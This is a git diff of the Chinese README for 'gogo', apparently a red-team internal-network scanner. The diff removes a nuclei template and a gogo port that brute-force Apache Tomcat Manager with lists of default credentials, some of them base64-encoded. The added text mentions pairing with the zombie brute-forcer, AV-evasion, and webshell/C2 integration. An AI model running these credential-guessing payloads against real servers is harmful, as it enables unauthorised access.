@@ -20,14 +20,14 @@
 
 ## 0x02 特点
 
-很多功能并不是一开始就有的, 但是我根据自评的使用频率排序来介绍gogo.
+很多功能并不是一开始就有的, 我根据自评的使用频率排序来介绍gogo.
 
 ### 启发式扫描
 在nmap,masscan那个年代, 对内网的扫描很少会超过c段, 更别说a段这种在当时几乎不可能完成的任务. 
 
 就算是现在的fscan, 或者相关特化的工具netspy中, 也不能很好的时间, 在我认为也只是一个demo.
 
-而gogo在很早就集成了根据经验公式的递归下降, 去发现网段. 并且通过生成器对扫描逻辑解耦, 几乎可以单独使用在任意一阶段. 例如
+而gogo在很早就集成了根据经验公式的递归下降去发现网段. 并且通过生成器对扫描逻辑解耦, 几乎可以任意组合不同的扫描阶段. 例如
 
 * 想绘制一下当前入口点能通的网络拓扑 (大约30分钟)
 * 只想看看10段内网里有多个B段被使用了 (大约30秒)
@@ -61,139 +61,9 @@ gogo的指纹与漏洞都将以完全的dsl语言的方式实现, 说人话就�
 
 指纹是我自研的规则库和格式, 因为并没有找到一个完全能满足我需求的规则库, 因此我自己写了一个, 整合了fofa的规则库, 以及fingerprinthub, fscan, kscan, allin中的一部分规则.
 
-而漏洞则是与nuclei的规则一致, 考虑到了内网环境, 我删除了一部分不重要的功能, 以简化二进制文件大小. 
+而漏洞则是与nuclei的大致兼容, 考虑到了内网环境, 我删除了一部分不必要的功能(动态dsl, oast等), 以简化二进制文件大小. 
 
-基本上可以从nuclei中移植poc, 只需要删除一些无用信息便可以快速加入到gogo中.
-
-举个例子.
-这是nuclei的tomcat默认漏洞登录poc
-```
-id: tomcat-default-login
-
-info:
-  name: ApahceTomcat Manager Default Login
-  author: pdteam
-  severity: high
-  description: Apache Tomcat Manager default login credentials were discovered. This template checks for multiple variations.
-  reference:
-    - https://www.rapid7.com/db/vulnerabilities/apache-tomcat-default-ovwebusr-password/
-  tags: tomcat,apache,default-login
-
-requests:
-  - raw:
-      - |
-        GET /manager/html HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Basic {{base64(username + ':' + password)}}
-    payloads:
-      username:
-        - tomcat
-        - admin
-        - ovwebusr
-        - j2deployer
-        - cxsdk
-        - ADMIN
-        - xampp
-        - tomcat
-        - QCC
-        - admin
-        - root
-        - role1
-        - role
-        - tomcat
-        - admin
-        - role1
-        - both
-        - admin
-
-      password:
-        - tomcat
-        - admin
-        - OvW*busr1
-        - j2deployer
-        - kdsxc
-        - ADMIN
-        - xampp
-        - s3cret
-        - QLogic66
-        - tomcat
-        - root
-        - role1
-        - changethis
-        - changethis
-        - j5Brn9
-        - tomcat
-        - tomcat
-        - 123456
-
-    attack: pitchfork  # Available options: sniper, pitchfork and clusterbomb
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - "Apache Tomcat"
-          - "Server Information"
-          - "Hostname"
-        condition: and
-
-      - type: status
-        status:
-          - 200
-```
-
-这是gogo中移植修改完的:
-```
-id: tomcat-manager-login
-info:
-  author: pdteam
-  name: tomcat-manager-default-password
-  severity: high
-  tags: tomcat-manager
-requests:
-  - raw:
-      - |
-        GET /manager/html HTTP/1.1
-        Host: {{Hostname}}
-        Authorization: Basic {{auth}}
-        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0
-    attack: sniper
-    stop-at-first-match: true
-    matchers:
-      - status:
-          - 200
-        type: status
-      - type: word
-        words:
-          - Apache Tomcat
-    extractors:
-      - type: regex
-        name: cookie
-        internal: true
-        part: header
-        regex:
-          - 'JSESSIONID\..*=([a-z0-9.]+)'
-    matchers-condition: and
-    payloads:
-      auth:
-        - dG9tY2F0OnRvbWNhdA==
-        - dG9tY2F0OnMzY3JldA==
-        - YWRtaW46YWRtaW4=
-        - b3Z3ZWJ1c3I6T3ZXKmJ1c3Ix
-        - ajJkZXBsb3llcjpqMmRlcGxveWVy
-        - Y3hzZGs6a2RzeGM=
-        - QURNSU46QURNSU4=
-        - eGFtcHA6eGFtcHA=
-        - UUNDOlFMb2dpYzY2
-        - YWRtaW46dG9tY2F0
-        - cm9vdDpyb290
-        - cm9sZTE6cm9sZTE=
-        - cm9sZTpjaGFuZ2V0aGlz
-        - dG9tY2F0OmNoYW5nZXRoaXM=
-        - YWRtaW46ajVCcm45
-        - cm9sZTE6dG9tY2F0
-```
+基本上可以从nuclei中移植poc, 只需要删除一些无用信息便可以快速加入到gogo中. 具体操作见[poc编写与移植](poc.md)
 
 因为我删除了动态的dsl生成(加上这个二进制会大一倍), 所以修改的只是编码后的auth字段. 如果poc中原来没有这种动态dsl, 那么几乎不需要修改.
 
@@ -212,7 +82,9 @@ zombie能做的不仅仅是口令的爆破, 还可以实现一些自动化的利
 
 让护网不再是一个一个登录上去截图, 而是gogo与zombie的快乐联动, 内网刷分, 一行命令!
 
-gogo结果可以直接导入到zombie. 不一定是内网命令行的联动, 因为大多数爆破场景其实并发要求不高, 甚至可以通过代理操作, 而不上传臃肿的zombie. 
+gogo结果可以直接导入到zombie. 实现类似fscan乱扫的功能, 但是不建议这样使用, 告警会填满设备.
+
+因为gogo与zombie的场景也不完全一致, zombie完全可以放在外网, 通过代理接入, 减轻zombie引入大量库的免杀压力. 
 
 在未来, 我打算编写一个gui界面的结果解析器与联动工具, 也可以是与c2 webshell的联动, 进一步简化操作, 让gogo与zombie的联动无缝衔接.
 
@@ -224,5 +96,5 @@ gogo结果可以直接导入到zombie. 不一定是内网命令行的联动, 因
 3. 与webshell, c2工具联动, 实现图形化 一键使用 (已经做了一部分)
 4. 与maitai(暂为公开的代理工具)联动, 实现gt流量的高性能转发
 5. 内网分布式部署, 多点同时扫描
-6. agent化, 特殊网络环境下, 可以只上传tiny agent
+6. agent化, 特殊网络环境下, 可以只上传tiny agent (通过maitai实现, todo)
 
